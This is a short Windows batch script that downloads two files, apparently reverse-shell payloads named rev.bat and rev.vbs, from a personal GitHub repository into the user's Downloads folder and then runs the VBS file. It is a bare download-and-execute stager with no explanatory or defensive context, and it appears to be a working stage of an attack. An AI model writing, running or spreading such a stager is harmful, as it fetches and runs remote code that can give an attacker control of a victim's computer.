@echo off
set "downloads_dir=%USERPROFILE%\Downloads"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.bat -o "%downloads_dir%\rev.bat"
curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/rev.vbs -o "%downloads_dir%\rev.vbs"
call "%downloads_dir%\rev.vbs"
exit
